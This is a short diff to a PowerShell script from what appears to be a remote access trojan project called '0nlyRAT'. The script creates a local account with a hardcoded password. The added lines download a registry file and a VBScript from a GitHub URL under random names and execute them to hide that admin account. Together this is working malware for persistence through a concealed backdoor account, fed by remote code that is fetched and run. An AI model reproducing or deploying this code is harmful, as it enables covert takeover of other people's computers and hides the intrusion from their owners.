@@ -25,10 +25,16 @@ $xf061name = random_text
 $xf061pass = (ConvertTo-SecureString "0nlyRAT123" -AsPlainText -Force)
 create_account -xf061name $xf061name -xf061pass $xf061pass
 
-# registry to hide local admin
+# Download registry to hide local admin
 $reg_file = random_text
+iwr -Uri "https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/files/admin.reg" -OutFile ".\$reg_file.reg"
 
+# Download VbScript file which will automate our registry entry
+$vbs_file = random_text
+iwr -Uri "https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/files/confirm.vbs" -OutFile ".\$vbs_file.vbs"
 
+# execute the registry entry process
+.\"$reg_file.reg";"$vbs_file.vbs"
 
 # Variables
 $directory = random_text
